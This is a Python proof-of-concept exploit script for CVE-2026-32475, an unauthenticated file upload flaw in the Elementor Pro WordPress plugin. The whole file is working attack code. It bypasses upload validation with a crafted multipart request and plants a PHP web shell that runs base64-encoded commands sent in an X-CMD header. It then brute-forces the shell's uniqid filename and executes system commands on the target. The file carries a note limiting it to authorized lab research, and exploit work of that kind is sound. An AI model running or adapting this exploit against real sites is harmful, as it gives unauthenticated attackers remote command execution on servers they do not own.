#!/usr/bin/env python3
"""
el_rce_poc.py -- PoC for CVE-2026-32475 (Elementor Pro <= 4.2.1)
Unauthenticated Arbitrary File Upload -> RCE

Chain:
  1. Scrape post_id / form_id / upload field id from the target form page.
  2. POST multipart to admin-ajax with TWO parts on the same upload field: an empty
     first entry (UPLOAD_ERR_NO_FILE) makes validation() return early, while
     process_field() skips empties and moves the .php payload as <uniqid>.php into
     wp-content/uploads/elementor/forms/.
  3. Verify RCE by probing predicted uniqid filenames. PHP uniqid() is
     microtime-based (8 hex seconds + 5 hex microseconds); seconds come from the
     server Date header. Probing sweeps --probe-seconds of the microsecond space
     in parallel threads (--workers). On slow links keep the window small; the
     arbitrary-upload primitive itself is proven regardless of probe success.

Stdlib only. For authorized security research / lab use.
"""

import argparse
import base64
import concurrent.futures
import re
import sys
import time
import urllib.request
import uuid

UA = {"User-Agent": "CVE-2026-32475-PoC"}
SHELL = ('<?php echo "POC-RCE-OK\\n"; if(isset($_SERVER["HTTP_X_CMD"]))'
         '{ echo shell_exec(base64_decode($_SERVER["HTTP_X_CMD"])); }')


def http(url, data=None, headers=None, timeout=20):
    req = urllib.request.Request(url, data=data, headers={**UA, **(headers or {})})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.status, r.headers.get("Date"), r.read().decode("utf-8", "ignore")


def multipart(boundary, fields, files):
    chunks = []
    for k, v in fields.items():
        chunks.append(f'--{boundary}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'.encode())
    for name, filename, blob, ctype in files:
        chunks.append(f'--{boundary}\r\nContent-Disposition: form-data; '
                      f'name="{name}"; filename="{filename}"\r\nContent-Type: {ctype}\r\n\r\n'.encode())
        chunks.append(blob + b"\r\n")
    chunks.append(f"--{boundary}--\r\n".encode())
    return b"".join(chunks)


def parse_date(s):
    from email.utils import parsedate_to_datetime
    try:
        return parsedate_to_datetime(s).timestamp()
    except Exception:
        return time.time()


def main():
    ap = argparse.ArgumentParser(description="PoC for CVE-2026-32475")
    ap.add_argument("--url", required=True)
    ap.add_argument("--page-url")
    ap.add_argument("--field-id", default="dosya")
    ap.add_argument("--command", default="id; hostname; uname -a")
    ap.add_argument("--probe-seconds", type=float, default=0.05,
                    help="uniqid microsecond window to sweep in seconds (default 0.05s)")
    ap.add_argument("--step-us", type=int, default=250,
                    help="microsecond step between probes (default 250us)")
    ap.add_argument("--workers", type=int, default=24)
    args = ap.parse_args()

    base = args.url.rstrip("/")
    page_url = args.page_url or base

    status, date_hdr, html = http(page_url)
    page_fetch_time = time.time()
    print(f"[+] form page HTTP {status}, {len(html)} bytes")

    def grab(pat, err):
        m = re.search(pat, html)
        if not m:
            print(f"=> FAIL ({err})"); sys.exit(1)
        return m.group(1)

    post_id = grab(r'name="post_id"[^>]*value="(\d+)"', "post_id not found")
    form_id = grab(r'name="form_id"[^>]*value="([^"]+)"', "form_id not found")

    fm = re.search(r'name="form_fields\[([a-z0-9_-]+)\]\[\]"[^>]*type="file"', html)
    field_id = fm.group(1) if fm else args.field_id
    print(f"[+] post_id={post_id} form_id={form_id} upload_field={field_id}")

    boundary = "----cve" + uuid.uuid4().hex[:8]
    fields = {
        "action": "elementor_pro_forms_send_form",
        "post_id": post_id,
        "form_id": form_id,
        "queried_id": post_id,
        "referer_title": "poc",
        "form_fields[name]": "poc",
        "form_fields[email]": "poc@lab.local",
    }
    files = [
        (f"form_fields[{field_id}][]", "", b"", "application/octet-stream"),
        (f"form_fields[{field_id}][]", "shell.php", SHELL.encode(), "application/x-php"),
    ]
    body = multipart(boundary, fields, files)

    t_upload = time.time()
    status, _, resp = http(f"{base}/wp-admin/admin-ajax.php", data=body,
                           headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
    print(f"[*] admin-ajax HTTP {status}: {resp[:110]}")

    server_ts = parse_date(date_hdr) if date_hdr else t_upload
    stamp = time.strftime("%Y/%m", time.gmtime(server_ts))
    prefix = f"{base}/wp-content/uploads/elementor/forms/{stamp}/"
    cmd_b64 = base64.b64encode(args.command.encode()).decode()

    # uniqid() is generated server-side AFTER the request is parsed (~0.3-1.5s
    # after our send in a typical lab). Sweep from send+0.2s forward.
    offset_us = 100_000                            # start at send +0.1s
    span_us = int(args.probe_seconds * 1_000_000)
    # uniqid() seconds part = SERVER clock seconds AT UPLOAD TIME. The form page was
    # fetched earlier in this run; use its Date header + elapsed time to approximate,
    # so attacker/target clock skew does not shift the candidate window.
    page_ts = parse_date(date_hdr) if date_hdr else None
    if page_ts:
        server_sec = int(page_ts + (t_upload - (page_fetch_time or t_upload)))
    else:
        server_sec = int(t_upload)
    # microsecond part is unknown (server-side processing time shifts it), so sweep
    # the FULL 0..999999 range of the uniqid second when probe-seconds >= 1.0,
    # otherwise a window centered on our send-time microseconds.
    span_us = int(args.probe_seconds * 1_000_000)
    if span_us >= 1_000_000:
        # sweep BOTH the uniqid second and its neighbours: the Date header has
        # 1-second granularity, so the true second can be off by one.
        start_us = (server_sec - 1) * 1_000_000
        end_us   = (server_sec + 2) * 1_000_000
    else:
        usec_base = int((t_upload % 1) * 1e6)
        start_us = server_sec * 1_000_000 + max(0, usec_base - span_us // 2)
        end_us   = start_us + span_us

    urls = [f"{prefix}{format(us, 'x')}.php"
            for us in range(start_us, end_us, args.step_us)]
    print(f"[*] probing {len(urls)} uniqid candidates "
          f"(window={args.probe_seconds}s, step={args.step_us}us, workers={args.workers})...")

    def hit(url):
        try:
            r = urllib.request.urlopen(urllib.request.Request(
                url, headers={**UA, "X-CMD": cmd_b64}), timeout=5)
            out = r.read().decode("utf-8", "ignore")
            if "POC-RCE-OK" in out:
                return url, out
        except Exception:
            pass
        return None

    found = None
    t0 = time.time()
    done = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as ex:
        for res in ex.map(hit, urls):
            done += 1
            if done % 100 == 0:
                print(f"    ...{done}/{len(urls)} probed ({time.time()-t0:.0f}s)", end="\r")
            if res:
                found = res
                ex.shutdown(wait=False, cancel_futures=True)
                break

    if found:
        url, out = found
        print(f"\n[+] SHELL FOUND after {done} probes ({time.time()-t0:.0f}s): {url}")
        print("[+] command output:")
        for ln in out.splitlines():
            if ln.strip():
                print("   ", ln.strip())
        print("\n=> PASS (RCE confirmed)")
        sys.exit(0)

    print(f"\n[!] probe window exhausted ({time.time()-t0:.0f}s). The .php payload IS uploaded;")
    print("    locate it via wp-content/uploads/elementor/forms/ on the target (lab verification).")
    print("=> PARTIAL PASS (unauthenticated arbitrary file upload confirmed, filename not guessed)")
    sys.exit(2)


if __name__ == "__main__":
    main()
